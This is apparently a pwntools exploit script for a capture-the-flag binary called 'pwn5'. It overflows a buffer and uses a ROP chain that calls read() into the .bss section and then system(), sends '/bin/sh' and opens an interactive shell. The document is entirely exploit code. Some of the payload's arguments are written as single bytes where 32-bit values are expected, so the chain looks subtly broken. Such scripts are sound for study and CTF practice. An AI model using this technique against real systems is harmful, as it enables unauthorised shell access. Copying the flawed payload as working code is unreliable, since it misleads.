from pwn import *

p=process('./pwn5')
print(p.recv(2020))

payload="A"*0xd+"A"*4
payload+=p32(0x0804dc50)#read
payload+=p32(0x080bb629)#pppr
payload+="\x00"
payload+=p32(0x080ebf80)#bss
payload+="\x08"
payload+=p32(0x0804ee30)#system
payload+="A"*4
payload+=p32(0x080ebf80)#bss

p.sendline(payload)
sleep(1)
print(p.recv(2020))
sleep(1)

p.send("/bin/sh\n")
p.interactive()
